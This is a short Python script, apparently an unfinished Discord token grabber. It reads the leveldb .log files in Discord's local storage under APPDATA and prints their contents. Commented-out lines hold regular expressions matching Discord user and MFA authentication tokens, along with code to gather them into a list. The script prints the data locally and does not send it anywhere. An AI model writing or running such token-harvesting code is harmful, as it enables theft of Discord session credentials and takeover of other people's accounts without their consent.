import os
from re import findall


def main():
    path = os.getenv('APPDATA') + '\\Discord' + '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log'):
            continue
        with open(f'{path}\\{file_name}') as file:
            for line in file.readlines():
                print(line.replace(' ', ''))
                print('|||||||||||||||||||||||||||')
        # for line in (x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()):
        #     print(line)
            # for token in findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
            #     tokens.append(token)
    print(tokens)


if __name__ == '__main__':
    main()